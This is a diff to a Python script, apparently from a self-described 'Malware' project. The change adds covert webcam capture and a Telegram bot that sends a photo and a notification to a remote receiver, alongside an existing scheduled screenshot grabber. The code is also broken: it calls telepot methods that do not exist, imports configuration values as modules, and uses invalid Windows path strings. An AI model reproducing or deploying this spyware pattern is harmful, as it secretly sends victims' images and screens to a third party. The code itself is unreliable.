@@ -1,11 +1,21 @@
 import time
-
+import cv2
 import pyscreenshot as ImageGrab
 import schedule
-
-
+import telepot
+import token 
+import receiver_id 
+import filepath 
 from datetime import datetime
 
+
+cap = cv2.VideoCapture(0)
+ret, frame = cap.read()
+cv2.imwrite('C:\Users\juanm\OneDrive\Desktop\Malware\Algoritmos-maliciosos', frame)   
+cap.release()
+bot = telepot.Bot(token)
+bot.notifyMessage(receiver_id, 'Picture Taken.') #enviar notificacion al usuario
+bot.sendPicture(receiver_id, photo=open('SCREENSHOT', 'rb'))
 
 def take_screenshot():
     print("Taking screenshot...")
@@ -13,7 +23,7 @@ def take_screenshot():
     image_name = f"screenshot-{str(datetime.now())}"
     screenshot = ImageGrab.grab()
 
-    filepathloc = f"./ALGORITMOS-MALICIOSOS/{image_name}.png"
+    filepathloc = f"C:\Users\juanm\OneDrive\Desktop\Malware\Algoritmos-maliciosos\malware.jpeg"
 
     screenshot.save(filepath)
 
